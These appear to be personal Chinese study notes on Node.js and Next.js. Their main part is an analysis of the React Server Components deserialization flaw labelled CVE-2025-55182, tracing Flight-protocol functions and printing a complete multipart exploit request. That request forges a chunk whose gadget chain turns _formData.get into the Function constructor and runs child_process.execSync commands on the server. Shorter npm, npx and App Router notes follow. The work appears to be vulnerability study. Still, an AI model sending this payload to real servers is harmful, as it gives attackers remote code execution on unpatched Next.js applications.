# 概念备忘

## Promise

如何创建一个Promise对象

```
```

## React Server Components (RSC)

通过json反序列化构造假的chunk对象 键 _response存储gadget链
通过getOutlineModel()Filght协议机制 覆盖_formData.get为Function对象
利用JS的promise机制 递归调用对象的then方法 触发Function()

当chunk_1中的$@0引用chunk_0时 有chunk_1.value = chunk_0 chunk_1状态ful

webpack://next/dist/src/server/app-render/action-handler.ts/handleAction() ->

> webpack://next/dist/compiled/react-server-dom-turbopack/cjs/react-server-dom-turbopack-server.node.development.js

- decodeReplyFromBusboy()

###  initializeModelChunk() model初始化反序列化



```JavaScript
    function initializeModelChunk(chunk) { //传入chunk状态为peddling
      ......
      var rootReference =
          -1 === chunk.reason ? void 0 : chunk.reason.toString(16),
        resolvedModel = chunk.value; //待反序列化json
      chunk.status = "cyclic";
      chunk.value = null;
      chunk.reason = null;
      try {
        var rawModel = JSON.parse(resolvedModel),//转为基础JS对象
          value = reviveModel( //reviveModel方法遍历JSON对象
            chunk._response,
            { "": rawModel },
            "",
            rawModel,
            rootReference
          );
        if (
          null !== initializingChunkBlockedModel &&
          0 < initializingChunkBlockedModel.deps
        )
          (initializingChunkBlockedModel.value = value),
            (chunk.status = "blocked");
        else {
          var resolveListeners = chunk.value;
          chunk.status = "fulfilled";
          chunk.value = value;
          null !== resolveListeners && wakeChunk(resolveListeners, value);
        }
      } catch (error) {
        (chunk.status = "rejected"), (chunk.reason = error);
      } finally {
        (initializingChunk = prevChunk),
          (initializingChunkBlockedModel = prevBlocked);
      }
    }
```

### reviveModel() 

递归解析JSON对象 遇到$开头的值 则按Flight协议的规定 拓展JSON类 

自定义的反序列化 

### parseModelString()

Filght解析$开头的值为拓展对象 RSC的数据协议处理方法

通过序列化控制当前chunk的_response的值:

```javascript
{
  "_prefix": "process.mainModule.require('child_process').execSync('calc');",
  "_formData": {"get": Function}  // Already resolved to Function constructor!
}
```

函数处理$B引用`{\"then\":\"$B1337\"}`时:

```javascript
case 'B': {  // Blob reference
  const id = parseInt(value.slice(2), 16);  // 0x1337 = 4919
  const prefix = response._prefix;           // MALICIOUS CODE STRING
  const blobKey = prefix + id;               // "process.mainModule...execSync('say haha');4919"

  const backingEntry = response._formData.get(blobKey);  // Function(blobKey)!
  return backingEntry;
}```

### getOutlinedModel()

处理chunk引用`$1` 获取另一个chunk_1的value数据

如:`"then":"$1:__proto__:then"` 
    
###  getChunk() 

ID获取chunk 返回是一个chunk_id本身 一个可控Promise

```javascript
//id 是multipart数据块的编号 有field和file区分
function getChunk(response, id) {
    var chunks = response._chunks, //response维护了Map:_chunks 作为缓存
    chunk = chunks.get(id);//chunkID先从缓存取
    chunk || //chunk == undefined
        ((chunk = response._formData.get(response._prefix + id)),//_chunks没有从formData解析
        (chunk = 
            null != chunk //chunk存在
            ? new Chunk("resolved_model", chunk, id, response)
            : response._closed //
            ? new Chunk("rejected", null, response._closedReason, response)
            : createPendingChunk(response)), 
        chunks.set(id, chunk));//解析完成的chuck接入缓存
    return chunk;
}
```

```javascript
Chunk.prototype = Object.create(Promise.prototype);
Chunk.prototype.then = function (resolve, reject) {
    switch (this.status) {
    case "resolved_model":
        initializeModelChunk(this);
    }
    switch (this.status) {
    case "fulfilled":
        resolve(this.value);
        break;
    case "pending":
    case "blocked":
    case "cyclic":
        resolve &&
        (null === this.value && (this.value = []),
        this.value.push(resolve));
        reject &&
        (null === this.reason && (this.reason = []),
        this.reason.push(reject));
        break;
    default:
        reject(this.reason);
    }
};
```

### cve-2025-55182

- busboy 底层的HTML表单数据multipart/form-data解析器
    - `busboyStream.on("field", function (name, value) {});`
    - field事件：当解析到普通文本字段时触发


```json
------WebKitFormBoundaryadoPKqu3sJ9sdigc
Content-Disposition: form-data; name="1_$ACTION_ID_40ac9588afdfd76aff27fd561c3a1e3f58ff46b93f"


------WebKitFormBoundaryadoPKqu3sJ9sdigc
Content-Disposition: form-data; name="1_name"


------WebKitFormBoundaryadoPKqu3sJ9sdigc
Content-Disposition: form-data; name="0"//标记为chunk0

{
	"then":"$1:__proto__:then",
	"status":"resolved_model",
	"reason":-1,
	"value":"{\"then\":\"$B1337\"}",
	"_response":{
		"_prefix":"process.mainModule.require('child_process').execSync('pwd');",
		"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}
	}
}

------WebKitFormBoundaryadoPKqu3sJ9sdigc--
```

### nodejs内存shell



## nvm node版本管理工具

scoop install nvm

scoop install fnm

## npm 包管理工具

- npm init	初始化项目	创建 package.json 文件（项目说明书）。
- npm install 	安装依赖	别名 npm i。会将包下载到 node_modules。
- npm install -g 	全局安装	安装到操作系统，随处可用（如 nodemon）。
- npm uninstall 	卸载依赖	从项目中移除不再需要的包。
- npm update	更新包	将依赖项升级到 package.json 允许的最新版本。
- npm run 	运行脚本	执行 package.json 中定义的自动化任务（如 dev, build）。
- npm list	查看已装包	列出当前项目安装的所有依赖及其版本。
- npm audit	安全检查	扫描项目依赖是否存在已知的安全漏洞并建议修复。

## npx包执行工具 = 查找 + 下载 + 执行 + 卸载

直接运行npm上的工具package，而无需先全局install

如果创建react应用 需要先安装:

`npm install -g create-react-app`

比如创建app 并指定版本
`npx create-next-app@15.5.6 nextjs-cve-2025-55182 --yes`

## App Router架构

app/ 目录下的特殊文件
在 App Router 模式下，文件夹名称决定 URL 路径，而文件夹内的文件名决定功能：

page.tsx: 定义该路径的 UI（唯一必须）。

layout.tsx: 定义该路径及其子路径的共享布局。

loading.tsx: 定义页面加载时的占位图（骨架屏）。

error.tsx: 定义当前路径发生错误时的回退界面。

not-found.tsx: 404 页面。

route.ts: 定义后端 API 接口（代替了旧版的 pages/api）。

